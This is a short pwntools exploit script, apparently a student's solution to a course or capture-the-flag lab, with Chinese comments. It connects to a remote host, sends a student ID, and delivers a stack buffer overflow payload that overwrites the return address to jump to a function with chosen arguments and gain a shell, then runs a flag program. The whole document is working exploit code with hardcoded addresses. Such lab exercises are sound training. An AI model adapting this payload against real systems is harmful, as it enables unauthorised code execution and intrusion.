from pwn import *

sh = remote('47.99.80.189', 10003)    # pwntools通过socket连接至远端
sh.recvuntil("Please input your StudentID:\n") # 远程环境统一要求输入学号    
sh.sendline('3180105507')
sh.recvuntil("[*] Give me something to overflow me! \n") 

# 通过缓冲区溢出覆盖程序的返回地址，并跳转至带有参数的目的函数获取shell
payload = b'a' * 32 + p32(0x08048516) + b'a' * 4 + p32(0xaaaabbbb) + p32(0xccccdddd) 
sh.sendline(payload)        # 发送计算的payload

sh.recvuntil("[HACKED]\n")    # 交互至接受完 "[HACKED]\n"
sh.sendline("./flag.exe 3180105507") 
sh.interactive()    # 将代码交互转换为手工交互